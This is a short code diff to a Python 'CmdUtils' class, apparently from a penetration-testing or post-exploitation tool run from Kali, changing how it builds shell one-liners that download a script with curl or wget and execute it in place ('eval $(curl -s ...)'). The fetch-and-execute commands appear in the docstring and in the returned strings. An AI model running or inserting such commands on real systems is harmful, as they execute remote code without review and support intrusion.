@@ -361,14 +361,14 @@ class CmdUtils:
         $ os
         os: command not found
         
-        $ source <(curl "http://127.0.0.1:8080/alias.sh") && kill %1
+        $ eval $(curl "http://127.0.0.1:8080/alias.sh") && kill %1
         $ os
         Linux kali ... GNU/Linux
         ```
 
         ```python3
         > CmdUtils.get_command_for_load(ShellTypes.Basic, 'http://127.0.0.1:9001/dnjkznker.log')
-        source <(curl "http://127.0.0.1:9001/dnjkznker.log")
+        eval $(curl -s "http://127.0.0.1:9001/dnjkznker.log")
         > ^D
         ```
         """
@@ -377,10 +377,10 @@ class CmdUtils:
 
         elif shell_type is ShellTypes.Basic:
             if "curl" in available_bin:
-                return f'source <(curl -s "{http_link}")'
+                return f'eval $(curl -s "{http_link}")'
 
             elif "wget" in available_bin:
-                return f'source <(wget -q -O - "{http_link}")'
+                return f'eval $(wget -q -O - "{http_link}")'
 
             else:
                 raise Exception("No binaries found for download")
